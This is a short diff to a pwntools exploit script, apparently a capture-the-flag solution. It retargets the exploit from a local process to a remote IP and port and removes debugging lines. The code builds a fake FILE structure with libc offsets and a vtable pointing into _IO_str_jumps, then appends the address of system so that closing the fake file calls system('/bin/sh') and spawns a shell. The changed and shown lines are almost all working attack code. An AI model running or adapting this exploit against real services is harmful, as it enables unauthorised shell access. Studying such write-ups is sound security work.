@@ -1,4 +1,5 @@
 from pwn import *
+import tty
 
 #init
 
@@ -7,8 +8,8 @@ libc = ELF('./libc-2.27.so')
 
 context.binary = e
 
-p = process(e.path)
-#p = remote('143.198.127.103', 42008)
+#p = process(e.path)
+p = remote('147.182.172.217', 42010)
 
 #funcs
 
@@ -80,7 +81,7 @@ f._IO_write_ptr = (libc_off + binsh_off - 100) // 2
 f._IO_buf_end =  (libc_off + binsh_off - 100) // 2
 f.vtable = libc_off + strjumps_off + 0x8
 
-log.info('File struct:\n' + str(f))
+#log.info('File struct:\n' + str(f))
 
 s = bytes(f)
 s += p64(libc_off + system_off)
@@ -90,7 +91,6 @@ p.sendline(s)
 
 #close fake file chnk on exit to call system('/bin/sh')
 
-gdb.attach(p)
 frd(1, 0x10)
 ex()
 
